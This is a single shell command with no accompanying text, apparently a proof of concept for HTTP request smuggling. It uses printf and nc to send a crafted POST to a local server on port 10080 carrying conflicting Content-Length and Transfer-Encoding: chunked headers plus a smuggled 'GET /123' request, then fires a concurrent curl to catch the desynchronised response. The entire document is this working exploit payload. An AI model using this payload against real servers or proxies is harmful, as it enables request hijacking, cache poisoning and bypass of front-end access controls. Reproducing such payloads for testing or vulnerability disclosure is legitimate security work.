printf 'POST / HTTP/1.1\r\n'\
'Host: 127.0.0.1\r\n'\
'Content-Length: 28\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'GET /123 HTTP/1.1\r\n'\
'a: a' | nc 127.0.0.1 10080 & curl 127.0.0.1:10080 -I
